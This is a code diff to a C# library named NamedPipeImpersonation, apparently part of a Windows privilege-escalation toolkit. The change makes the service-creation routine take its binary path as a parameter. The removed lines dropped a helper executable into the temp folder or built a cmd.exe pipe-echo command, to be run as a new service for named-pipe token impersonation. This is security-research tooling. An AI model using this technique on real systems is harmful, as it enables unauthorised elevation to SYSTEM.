@@ -147,35 +147,10 @@ namespace NamedPipeImpersonation.Library
         }
 
 
-        public static IntPtr StartNamedPipeClientService()
+        public static IntPtr StartNamedPipeClientService(string binpath)
         {
-            IntPtr hSCManager;
-            string command;
             var hService = IntPtr.Zero;
-
-            if (Globals.MethodId == 1)
-            {
-                try
-                {
-                    Globals.BinaryPath = string.Format(@"{0}\PrivFuPipeClient.exe", Path.GetTempPath().TrimEnd('\\'));
-                    File.WriteAllBytes(Globals.BinaryPath, Globals.BinaryData);
-                }
-                catch
-                {
-                    return IntPtr.Zero;
-                }
-
-                command = string.Format(@"{0} {1}", Globals.BinaryPath, Globals.ServiceName);
-            }
-            else
-            {
-                command = string.Format(
-                    @"{0} /c echo {1} > \\localhost\pipe\{1}",
-                    Environment.GetEnvironmentVariable("COMSPEC"),
-                    Globals.ServiceName);
-            }
-
-            hSCManager = NativeMethods.OpenSCManager(
+            IntPtr hSCManager = NativeMethods.OpenSCManager(
                 null,
                 null,
                 ACCESS_MASK.SC_MANAGER_CONNECT | ACCESS_MASK.SC_MANAGER_CREATE_SERVICE);
@@ -190,7 +165,7 @@ namespace NamedPipeImpersonation.Library
                     SERVICE_TYPE.Win32OwnProcess,
                     START_TYPE.Demand,
                     ERROR_CONTROL.Normal,
-                    command,
+                    binpath,
                     null,
                     IntPtr.Zero,
                     null,
